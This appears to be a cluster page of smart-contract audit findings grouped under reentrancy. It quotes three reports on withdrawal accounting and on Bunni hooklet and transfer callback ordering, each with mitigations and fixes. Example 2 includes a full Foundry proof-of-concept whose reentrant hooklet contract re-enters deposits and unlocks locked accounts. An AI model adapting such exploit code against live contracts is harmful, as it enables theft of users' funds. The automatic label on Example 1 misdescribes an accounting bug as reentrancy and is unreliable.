# Cluster -1284

**Rank:** #29  
**Count:** 624  

## Label
Reentrancy vulnerabilities enable attackers to exploit recursive function calls before state updates, leading to unauthorized fund extraction or incorrect state transitions through improper interaction ordering and missing guards.

## Cluster Information
- **Total Findings:** 624

## Examples

### Example 1

**Auto Label:** Reentrancy vulnerabilities enable attackers to drain funds via recursive calls, exploiting missing checks and state updates, leading to total fund loss and system failure.  

**Original Text Preview:**

## Severity

High

## Description

In the withdraw(address recipient) function, when the withdrawal amount is less than
or equal to currentWithheldETH, the function enters the instant withdrawal path. In this case, the
contract does not call plumeStaking.withdraw(), and the funds are expected to be fully covered by the
ETH already held in currentWithheldETH. However, the code still sets withdrawn = amount and then
unconditionally adds this value back to currentWithheldETH. Immediately after, it subtracts amount
from currentWithheldETH, effectively leaving the value of currentWithheldETH unchanged.

```solidity
} else {
fee = amount * INSTANT_REDEMPTION_FEE / RATIO_PRECISION;
withdrawn = amount;
}
uint256 cachedWithheldETH = currentWithheldETH;
currentWithheldETH += withdrawn; // adding the withdraw amount
withHoldEth += fee;
currentWithheldETH -= amount; // deducting the amount
```

This logic is flawed because the ETH used to fulfill the withdrawal is not newly received; it is already
present in currentWithheldETH, and should simply be subtracted, not first added and then subtracted.
The current logic makes it appear as if no ETH was withdrawn, which results in incorrect accounting
of the withheld pool. If multiple such withdrawals occur, the system will consistently over-report the
available withheld ETH, potentially leading to over-withdrawals or failed withdrawals in the future
when actual funds are not available.

## Team Response

Fixed.

---
### Example 2

**Auto Label:** Reentrancy vulnerabilities enable attackers to exploit recursive function calls before state updates, leading to unauthorized fund extraction or incorrect state transitions through improper interaction ordering and missing guards.  

**Original Text Preview:**

**Description:** `ERC20Referrer::transfer` invokes the `_afterTokenTransfer()` hook before the unlocker callback (assuming the recipient is locked):

```solidity
function transfer(address to, uint256 amount) public virtual override returns (bool) {
    ...

    _afterTokenTransfer(msgSender, to, amount);

    // Unlocker callback if `to` is locked.
    if (toLocked) {
        IERC20Unlocker unlocker = unlockerOf(to);
        unlocker.lockedUserReceiveCallback(to, amount);
    }

    return true;
}
```

However, this should be performed after the callback since `BunniToken` overrides the hook to call the hooklet which can execute over intermediate state before execution of the unlocker callback:

```solidity
function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
    // call hooklet
    IHooklet hooklet_ = hooklet();
    if (hooklet_.hasPermission(HookletLib.AFTER_TRANSFER_FLAG)) {
        hooklet_.hookletAfterTransfer(msg.sender, poolKey(), this, from, to, amount);
    }
}
```

Additionally, while the `BunniHub` implements a re-entrancy guard, this does not prevent cross-contract re-entrancy between the `BunniHub` and `BunniToken` contracts via hooklet calls. A valid exploit affecting legitimate pools has not been identified, but this is not a guarantee that such a vulnerability does not exist. As a matter of best practice, cross-contract re-entrancy should be forbidden.

**Impact:** * A locked receiver could invoke the unlocker within the hooklet call to unlock their account. The callback would continue to be executed, potentially abusing the locking functionality to accrue rewards to an account that is no longer locked.
* The referral score of the protocol can be erroneously credited to a different referrer.
* Deposits to the `BunniHub` can be made by re-entering `BunniToken` transfers via hooklet calls in the token transfer hooks, potentially corrupting referral reward accounting.

**Proof of Concept:** The following modifications to `BunniToken.t.sol` demonstrate all re-entrancy vectors:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity ^0.8.4;

import {IUnlockCallback} from "@uniswap/v4-core/src/interfaces/callback/IUnlockCallback.sol";

import {LibString} from "solady/utils/LibString.sol";

import "./BaseTest.sol";
import "./mocks/ERC20UnlockerMock.sol";

import {console2} from "forge-std/console2.sol";

contract User {
    IPermit2 internal constant PERMIT2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    address referrer;
    address unlocker;
    address token0;
    address token1;
    address weth;

    constructor(address _token0, address _token1, address _weth) {
        token0 = _token0;
        token1 = _token1;
        weth = _weth;
    }

    receive() external payable {}

    function updateReferrer(address _referrer) external {
        referrer = _referrer;
    }

    function doDeposit(
        IBunniHub hub,
        IBunniHub.DepositParams memory params
    ) external payable {
        params.referrer = referrer;
        IERC20(Currency.unwrap(params.poolKey.currency1)).approve(address(PERMIT2), type(uint256).max);
        PERMIT2.approve(address(Currency.unwrap(params.poolKey.currency1)), address(hub), type(uint160).max, type(uint48).max);

        PERMIT2.approve(address(token0), address(hub), type(uint160).max, type(uint48).max);
        PERMIT2.approve(address(token1), address(hub), type(uint160).max, type(uint48).max);
        PERMIT2.approve(address(weth), address(hub), type(uint160).max, type(uint48).max);

        console2.log("doing re-entrant deposit");
        (uint256 shares,,) = hub.deposit{value: msg.value}(params);
    }

    function updateUnlocker(address _unlocker) external {
        console2.log("updating unlocker: %s", _unlocker);
        unlocker = _unlocker;
    }

    function doUnlock() external {
        if(ERC20UnlockerMock(unlocker).token().isLocked(address(this))) {
            console2.log("doing unlock");
            ERC20UnlockerMock(unlocker).unlock(address(this));
        }
    }
}

contract ReentrantHooklet is IHooklet {
    IPermit2 internal constant PERMIT2 = IPermit2(0x000000000022D473030F116dDEE9F6B43aC78BA3);
    BunniTokenTest test;
    User user;
    IBunniHub hub;
    bool entered;

    constructor(BunniTokenTest _test, IBunniHub _hub, User _user) {
        test = _test;
        hub = _hub;
        user = _user;
    }

    receive() external payable {}

    function beforeTransfer(address sender, PoolKey memory key, IBunniToken bunniToken, address from, address to, uint256 amount) external returns (bytes4) {
        if (!entered && address(user) == to && IERC20(address(bunniToken)).balanceOf(address(user)) == 0) {
            entered = true;
            console2.log("making re-entrant deposit");

            uint256 depositAmount0 = 1 ether;
            uint256 depositAmount1 = 1 ether;
            uint256 value;
            if (key.currency0.isAddressZero()) {
                value = depositAmount0;
            } else if (key.currency1.isAddressZero()) {
                value = depositAmount1;
            }

            // deposit tokens
            IBunniHub.DepositParams memory depositParams = IBunniHub.DepositParams({
                poolKey: key,
                amount0Desired: depositAmount0,
                amount1Desired: depositAmount1,
                amount0Min: 0,
                amount1Min: 0,
                deadline: block.timestamp,
                recipient: address(user),
                refundRecipient: address(user),
                vaultFee0: 0,
                vaultFee1: 0,
                referrer: address(0)
            });

            user.doDeposit{value: value}(hub, depositParams);
        }

        return this.beforeTransfer.selector;
    }

    function afterTransfer(address sender, PoolKey memory key, IBunniToken bunniToken, address from, address to, uint256 amount) external returns (bytes4) {
        user.doUnlock();
        return this.afterTransfer.selector;
    }

    function beforeInitialize(address sender, IBunniHub.DeployBunniTokenParams calldata params)
        external
        returns (bytes4 selector) {
            return this.beforeInitialize.selector;
        }

    function afterInitialize(
        address sender,
        IBunniHub.DeployBunniTokenParams calldata params,
        InitializeReturnData calldata returnData
    ) external returns (bytes4 selector) {
        return this.afterInitialize.selector;
    }

    function beforeDeposit(address sender, IBunniHub.DepositParams calldata params)
        external
        returns (bytes4 selector) {
            return this.beforeDeposit.selector;
        }

    function beforeDepositView(address sender, IBunniHub.DepositParams calldata params)
        external
        view
        returns (bytes4 selector) {
            return this.beforeDeposit.selector;
        }

    function afterDeposit(
        address sender,
        IBunniHub.DepositParams calldata params,
        DepositReturnData calldata returnData
    ) external returns (bytes4 selector) {
        return this.afterDeposit.selector;
    }

    function afterDepositView(
        address sender,
        IBunniHub.DepositParams calldata params,
        DepositReturnData calldata returnData
    ) external view returns (bytes4 selector) {
        return this.afterDeposit.selector;
    }

    function beforeWithdraw(address sender, IBunniHub.WithdrawParams calldata params)
        external
        returns (bytes4 selector) {
            return this.beforeWithdraw.selector;
        }

    function beforeWithdrawView(address sender, IBunniHub.WithdrawParams calldata params)
        external
        view
        returns (bytes4 selector) {
            return this.beforeWithdraw.selector;
        }

    function afterWithdraw(
        address sender,
        IBunniHub.WithdrawParams calldata params,
        WithdrawReturnData calldata returnData
    ) external returns (bytes4 selector) {
        return this.afterWithdraw.selector;
    }

    function afterWithdrawView(
        address sender,
        IBunniHub.WithdrawParams calldata params,
        WithdrawReturnData calldata returnData
    ) external view returns (bytes4 selector) {
        return this.afterWithdraw.selector;
    }

    function beforeSwap(address sender, PoolKey calldata key, IPoolManager.SwapParams calldata params)
        external
        returns (bytes4 selector, bool feeOverriden, uint24 fee, bool priceOverridden, uint160 sqrtPriceX96) {
            return (this.beforeSwap.selector, false, 0, false, 0);
        }

    function beforeSwapView(address sender, PoolKey calldata key, IPoolManager.SwapParams calldata params)
        external
        view
        returns (bytes4 selector, bool feeOverriden, uint24 fee, bool priceOverridden, uint160 sqrtPriceX96) {
            return (this.beforeSwap.selector, false, 0, false, 0);
        }

    function afterSwap(
        address sender,
        PoolKey calldata key,
        IPoolManager.SwapParams calldata params,
        SwapReturnData calldata returnData
    ) external returns (bytes4 selector) {
        return this.afterSwap.selector;
    }

    function afterSwapView(
        address sender,
        PoolKey calldata key,
        IPoolManager.SwapParams calldata params,
        SwapReturnData calldata returnData
    ) external view returns (bytes4 selector) {
        return this.afterSwap.selector;
    }
}

contract BunniTokenTest is BaseTest, IUnlockCallback {
    using LibString for *;
    using CurrencyLibrary for Currency;

    uint256 internal constant MAX_REL_ERROR = 1e4;

    IBunniToken internal bunniToken;
    ERC20UnlockerMock internal unlocker;
    // address bob = makeAddr("bob");
    address payable bob;
    address alice = makeAddr("alice");
    address refA = makeAddr("refA");
    address refB = makeAddr("refB");
    Currency internal currency0;
    Currency internal currency1;
    PoolKey internal key;

    function setUp() public override {
        super.setUp();

        currency0 = CurrencyLibrary.ADDRESS_ZERO;
        currency1 = Currency.wrap(address(token1));

        // deploy BunniToken
        bytes32 ldfParams = bytes32(abi.encodePacked(ShiftMode.BOTH, int24(-30), int16(6), ALPHA));
        bytes memory hookParams = abi.encodePacked(
            FEE_MIN,
            FEE_MAX,
            FEE_QUADRATIC_MULTIPLIER,
            FEE_TWAP_SECONDS_AGO,
            POOL_MAX_AMAMM_FEE,
            SURGE_HALFLIFE,
            SURGE_AUTOSTART_TIME,
            VAULT_SURGE_THRESHOLD_0,
            VAULT_SURGE_THRESHOLD_1,
            REBALANCE_THRESHOLD,
            REBALANCE_MAX_SLIPPAGE,
            REBALANCE_TWAP_SECONDS_AGO,
            REBALANCE_ORDER_TTL,
            true, // amAmmEnabled
            ORACLE_MIN_INTERVAL,
            MIN_RENT_MULTIPLIER
        );

        // deploy ReentrantHooklet with all flags
        bytes32 salt;
        unchecked {
            bytes memory creationCode = abi.encodePacked(
                type(ReentrantHooklet).creationCode,
                abi.encode(
                    this,
                    hub,
                    User(bob)
                )
            );
            uint256 offset;
            while (true) {
                salt = bytes32(offset);
                address deployed = computeAddress(address(this), salt, creationCode);
                if (
                    uint160(bytes20(deployed)) & HookletLib.ALL_FLAGS_MASK == HookletLib.ALL_FLAGS_MASK
                        && deployed.code.length == 0
                ) {
                    break;
                }
                offset++;
            }
        }

        bob = payable(address(new User(address(token0), address(token1), address(weth))));
        vm.label(address(bob), "bob");
        vm.label(address(token0), "token0");
        vm.label(address(token1), "token1");
        ReentrantHooklet hooklet = new ReentrantHooklet{salt: salt}(this, hub, User(bob));

        if (currency0.isAddressZero()) {
            vm.deal(address(hooklet), 100 ether);
            vm.deal(address(bob), 100 ether);
        } else if (Currency.unwrap(currency0) == address(weth)) {
            vm.deal(address(this), 200 ether);
            weth.deposit{value: 200 ether}();
            weth.transfer(address(hooklet), 100 ether);
            weth.transfer(address(bob), 100 ether);
        } else {
            deal(Currency.unwrap(currency0), address(hooklet), 100 ether);
            deal(Currency.unwrap(currency0), address(bob), 100 ether);
        }

        if (Currency.unwrap(currency1) == address(weth)) {
            vm.deal(address(this), 200 ether);
            weth.deposit{value: 200 ether}();
            weth.transfer(address(hooklet), 100 ether);
            weth.transfer(address(bob), 100 ether);
        } else {
            deal(Currency.unwrap(currency1), address(hooklet), 100 ether);
            deal(Currency.unwrap(currency1), address(bob), 100 ether);
        }

        (bunniToken, key) = hub.deployBunniToken(
            IBunniHub.DeployBunniTokenParams({
                currency0: currency0,
                currency1: currency1,
                tickSpacing: 10,
                twapSecondsAgo: 7 days,
                liquidityDensityFunction: ldf,
                hooklet: IHooklet(address(hooklet)),
                ldfType: LDFType.DYNAMIC_AND_STATEFUL,
                ldfParams: ldfParams,
                hooks: bunniHook,
                hookParams: hookParams,
                vault0: ERC4626(address(0)),
                vault1: ERC4626(address(0)),
                minRawTokenRatio0: 0.08e6,
                targetRawTokenRatio0: 0.1e6,
                maxRawTokenRatio0: 0.12e6,
                minRawTokenRatio1: 0.08e6,
                targetRawTokenRatio1: 0.1e6,
                maxRawTokenRatio1: 0.12e6,
                sqrtPriceX96: uint160(Q96),
                name: "BunniToken",
                symbol: "BUNNI",
                owner: address(this),
                metadataURI: "",
                salt: bytes32(0)
            })
        );

        poolManager.setOperator(address(bunniToken), true);

        unlocker = new ERC20UnlockerMock(IERC20Lockable(address(bunniToken)));
        vm.label(address(unlocker), "unlocker");
        User(bob).updateUnlocker(address(unlocker));
    }

    function test_PoCUnlockerReentrantHooklet() external {
        uint256 amountAlice = _makeDeposit(key, 1 ether, 1 ether, alice, refA);
        uint256 amountBob = _makeDeposit(key, 1 ether, 1 ether, bob, refB);

        // lock account as `bob`
        vm.prank(bob);
        bunniToken.lock(unlocker, "");
        assertTrue(bunniToken.isLocked(bob), "isLocked returned false");
        assertEq(address(bunniToken.unlockerOf(bob)), address(unlocker), "unlocker incorrect");
        assertEq(unlocker.lockedBalances(bob), amountBob, "locked balance incorrect");

        // transfer from `alice` to `bob`
        vm.prank(alice);
        bunniToken.transfer(bob, amountAlice);

        assertEq(bunniToken.balanceOf(alice), 0, "alice balance not 0");
        assertEq(bunniToken.balanceOf(bob), amountAlice + amountBob, "bob balance not equal to sum of amounts");
        console2.log("locked balance of bob: %s", unlocker.lockedBalances(bob));
        console2.log("but bunniToken.isLocked(bob) actually now returns: %s", bunniToken.isLocked(bob));
    }

    function test_PoCMinInitialSharesScore() external {
        uint256 amount = _makeDeposit(key, 1 ether, 1 ether, alice, address(0));
        assertEq(bunniToken.scoreOf(address(0)), amount + MIN_INITIAL_SHARES, "initial score not 0");

        // transfer from `alice` to `bob` (re-entrant deposit)
        vm.prank(alice);
        bunniToken.transfer(bob, amount);

        console2.log("score of address(0): %s != %s", bunniToken.scoreOf(address(0)), MIN_INITIAL_SHARES);
        console2.log("score of refB: %s", bunniToken.scoreOf(refB));
    }

    function test_PoCCrossContractReentrantHooklet() external {
        // 1. Make initial deposit from alice with referrer refA
        address referrer = refA;
        assertEq(bunniToken.scoreOf(referrer), 0, "initial score not 0");
        console2.log("making initial deposit");
        uint256 amount = _makeDeposit(key, 1 ether, 1 ether, alice, referrer);
        assertEq(bunniToken.referrerOf(alice), referrer, "referrer incorrect");
        assertEq(bunniToken.balanceOf(alice), amount, "balance not equal to amount");
        assertEq(bunniToken.scoreOf(referrer), amount, "score not equal to amount");

        // 2. Distribute rewards
        poolManager.unlock(abi.encode(currency0, 1 ether));
        bunniToken.distributeReferralRewards(true, 1 ether);
        (uint256 claimable, ) = bunniToken.getClaimableReferralRewards(address(0));
        console2.log("claimable of address(0): %s", claimable);
        (claimable, ) = bunniToken.getClaimableReferralRewards(refA);
        console2.log("claimable of refA: %s", claimable);

        // 3. Transfer bunni token to bob (re-entrant)
        referrer = address(0);
        assertEq(bunniToken.referrerOf(bob), referrer, "bob initial referrer incorrect");
        assertEq(bunniToken.scoreOf(referrer), 1e12, "initial score of referrer not MIN_INITIAL_SHARES");
        referrer = refB;
        assertEq(bunniToken.scoreOf(referrer), 0, "initial score referrer not 0");

        console2.log("transferring (re-entrant deposit)");
        // update state in User contract to use refB in deposit
        referrer = refB;
        User(bob).updateReferrer(referrer);
        vm.prank(alice);
        bunniToken.transfer(bob, amount);

        // 4. After the transfer finishes
        assertEq(bunniToken.referrerOf(bob), referrer, "referrer incorrect");
        assertGt(bunniToken.balanceOf(bob), amount, "balance not greater than amount");

        uint256 totalSupply = bunniToken.totalSupply();
        uint256 totalScore = bunniToken.scoreOf(address(0)) + bunniToken.scoreOf(refA) + bunniToken.scoreOf(refB);
        console2.log("totalSupply: %s", totalSupply);
        console2.log("totalScore: %s", totalScore);

        address[] memory referrerAddresses = new address[](3);
        referrerAddresses[0] = address(0);
        referrerAddresses[1] = refA;
        referrerAddresses[2] = refB;
        uint256[] memory referrerScores = new uint256[](3);
        uint256[] memory claimableAmounts = new uint256[](3);
        for (uint256 i; i < referrerAddresses.length; i++) {
            referrerScores[i] = bunniToken.scoreOf(referrerAddresses[i]);
            console2.log("score of %s: %s", referrerAddresses[i], referrerScores[i]);
            (uint256 claimable0, ) =
                bunniToken.getClaimableReferralRewards(referrerAddresses[i]);
            claimableAmounts[i] = claimable0;
            console2.log("claimable amount of %s: %s", referrerAddresses[i], claimable0);
        }
    }
}
```

**Recommended Mitigation:** * Re-order the unlocker callback logic to ensure the `_afterTokenTransfer()` hook is invoked at the very end of execution. This also applies to `transferFrom()`, both overloaded implementations of `_mint()`, and `_transfer()`.
* Apply a global guard to prevent cross-contract re-entrancy.

**Bacon Labs:** Fixed in [PR \#102](https://github.com/timeless-fi/bunni-v2/pull/102).

**Cyfrin:** Verified, the after token transfer hook is now invoked after the unlocker callback.

---
### Example 3

**Auto Label:** Reentrancy vulnerabilities enable attackers to drain funds via recursive calls, exploiting missing checks and state updates, leading to total fund loss and system failure.  

**Original Text Preview:**

**Description:** Hooklets are intended to allow pool deployers to inject custom logic into various key pool operations such as initialization, deposits, withdrawals, swaps and Bunni token transfers.

To ensure that the hooklet invocations receive actual return values, all after operation hooks should be placed at the end of the corresponding functions; however, `BunniHubLogic::deposit` refunds excess ETH to users before the `hookletAfterDeposit()` call is executed which can result in cross-contract reentrancy when a user transfers Bunni tokens before the hooklet's state has updated:

```solidity
    function deposit(HubStorage storage s, Env calldata env, IBunniHub.DepositParams calldata params)
        external
        returns (uint256 shares, uint256 amount0, uint256 amount1)
    {
        ...
        // refund excess ETH
        if (params.poolKey.currency0.isAddressZero()) {
            if (address(this).balance != 0) {
@>              params.refundRecipient.safeTransferETH(
                    FixedPointMathLib.min(address(this).balance, msg.value - amount0Spent)
                );
            }
        } else if (params.poolKey.currency1.isAddressZero()) {
            if (address(this).balance != 0) {
@>              params.refundRecipient.safeTransferETH(
                    FixedPointMathLib.min(address(this).balance, msg.value - amount1Spent)
                );
            }
        }

        // emit event
        emit IBunniHub.Deposit(msgSender, params.recipient, poolId, amount0, amount1, shares);

        /// -----------------------------------------------------------------------
        /// Hooklet call
        /// -----------------------------------------------------------------------

@>      state.hooklet.hookletAfterDeposit(
            msgSender, params, IHooklet.DepositReturnData({shares: shares, amount0: amount0, amount1: amount1})
        );
    }
```

This causes the `BunniToken` transfer hooks to be invoked on the Hooklet before notification of the deposit has concluded:

```solidity
    function _beforeTokenTransfer(address from, address to, uint256 amount, address newReferrer) internal override {
        ...
        // call hooklet
        // occurs after the referral reward accrual to prevent the hooklet from
        // messing up the accounting
        IHooklet hooklet_ = hooklet();
        if (hooklet_.hasPermission(HookletLib.BEFORE_TRANSFER_FLAG)) {
@>          hooklet_.hookletBeforeTransfer(msg.sender, poolKey(), this, from, to, amount);
        }
    }

    function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
        // call hooklet
        IHooklet hooklet_ = hooklet();
        if (hooklet_.hasPermission(HookletLib.AFTER_TRANSFER_FLAG)) {
@>          hooklet_.hookletAfterTransfer(msg.sender, poolKey(), this, from, to, amount);
        }
    }
```

**Impact:** The potential impact depends on the custom logic of a given Hooklet implementation and its associated accounting.

**Recommended Mitigation:** Consider moving the refund logic to after the `hookletAfterDeposit()` call. This ensures that the hooklet's state is updated before the refund is made, preventing the potential for re-entrancy.

**Bacon Labs:** Fixed in [PR \#120](https://github.com/timeless-fi/bunni-v2/pull/120).

**Cyfrin:** Verified, the excess ETH refund in `BunniHubLogic::deposit` has been moved to after the Hooklet call.

---
